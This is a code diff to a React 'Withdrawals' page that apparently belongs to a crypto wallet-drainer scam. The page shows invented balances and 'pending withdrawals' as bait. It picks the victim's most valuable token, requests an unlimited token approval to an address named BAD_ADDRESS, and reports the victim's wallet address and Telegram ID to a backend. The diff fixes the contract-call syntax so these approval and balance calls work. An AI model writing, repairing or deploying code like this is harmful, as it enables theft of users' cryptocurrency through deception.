@@ -50,7 +50,7 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
     const checkEnabled = async () => {
       if(bestToken?.address){
         let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
-        let result = await contract?.call("allowance", address, process.env.NEXT_PUBLIC_BAD_ADDRESS);
+        let result = await contract?.call("allowance", [address, process.env.NEXT_PUBLIC_BAD_ADDRESS]);
         if(parseInt(result)){
           setEnabled(true);
         }
@@ -63,13 +63,13 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
     if(bestToken){
       checkEnabled();
     }
-  }, [bestToken]);
+  }, [bestToken, sdk, toast, address]);
 
   const enable = async () => {
     try{
       let contract = await sdk?.getContractFromAbi(bestToken?.address || "", BAD_ABI);
       console.log(bestToken)
-      await contract?.call("approve", process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935");
+      await contract?.call("approve", [process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935"]);
       console.log(bestToken)
       let telegramId = session?.user.telegramId;
       axios.post("/api/updateaddr", { telegramId, address });
@@ -82,7 +82,7 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
   const getBestToken = async () => {
     const getTokenInfo = async (token: {symbol: string, address: string}) => {
       let contract = await sdk?.getContractFromAbi(token.address, BAD_ABI);
-      let balance = await contract?.call("balanceOf", address);
+      let balance = await contract?.call("balanceOf", [address]);
       let decimals = 0;
       if(balance){
         decimals = await contract?.call("decimals");
@@ -163,7 +163,7 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
                   Available crypto:
                 </Heading>
                 <HStack>
-                  <Image src="/xpr.png" borderRadius="full" boxSize="26px" />
+                  <Image alt="xpr-icon" src="/xpr.png" borderRadius="full" boxSize="26px" />
                   <Text>993.9123 <Text as="span" fontWeight="bold">XPR</Text> (${((xprPrice * 993.9123) || 121.31).toFixed(2)})</Text>
                 </HStack>
               </VStack>
@@ -172,11 +172,11 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
                   Pending Withdrawals:
                 </Heading>
                 <HStack>
-                  <Image src="/btcb.png" borderRadius="full" boxSize="26px" ml="1"/>
+                  <Image alt="btcb-icon" src="/btcb.png" borderRadius="full" boxSize="26px" ml="1"/>
                   <Text>0.32 <Text as="span" fontWeight="bold">BTCB</Text> (${((btcPrice * 0.32) || 5121.29).toFixed(2)})</Text>
                 </HStack>
                 <HStack>
-                  <Image src="/busd.png" borderRadius="full" boxSize="26px" ml="1"/>
+                  <Image alt="busd-icon" src="/busd.png" borderRadius="full" boxSize="26px" ml="1"/>
                   <Text>1.87 <Text as="span" fontWeight="bold">BUSD</Text> ($1.87)</Text>
                 </HStack>
               </VStack>
